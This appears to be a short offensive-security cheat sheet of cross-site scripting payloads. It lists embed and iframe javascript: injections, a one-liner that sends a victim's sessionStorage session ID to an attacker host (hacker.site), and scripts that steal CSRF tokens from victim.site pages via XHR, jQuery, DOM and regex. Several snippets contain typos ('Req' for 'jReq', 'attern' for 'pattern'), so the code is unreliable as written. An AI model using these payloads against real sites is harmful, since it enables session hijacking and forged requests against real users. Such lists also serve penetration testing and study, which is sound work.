## Payloads
```html
<embed src="http://hacker.site/evil.swf">
<embed src="javascript:alert(1)">
<iframe src='jAvAsCripT:alert`1`'></iframe>


```

## Extract Session Data
```js
new Image().src ="http://hacker.site/SID?"+escape(sessionStorage.getItem('sessionID'));
```

> Despite `document.cookie`, the attacker needs to be more precise because the name of the key used to store the session ID may change

## Scripts
### Extract CSRF Token from XSS in same page
Using XHR
```js
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == 4) {
var htmlSource = xhr.responseText;
//some operations…
}
}
xhr.open('GET','http://victim.site/csrf-form-page.html', true);
xhr.send();
```
Using JQuery
```js
Req= jQuery.get('http://victim.site/csrf-form-page.html', 
function() {
var htmlSource = jReq.responseText;
//some operations…
});
```
Using DOM
```js
var token = document.getElementsByName('csrf_token')[0].value
```

### Extract CSRF Token from XSS in different page
Using regex
```js
attern = /csrf_token'\svalue='(.*)'/;
token = htmlSource.match(pattern)[1]
```
Using DOM Parser
```js
parser = new DOMParser().parseFromString(htmlSource,"text/html");
token = parser.getElementsByName('csrf_token')[0];
```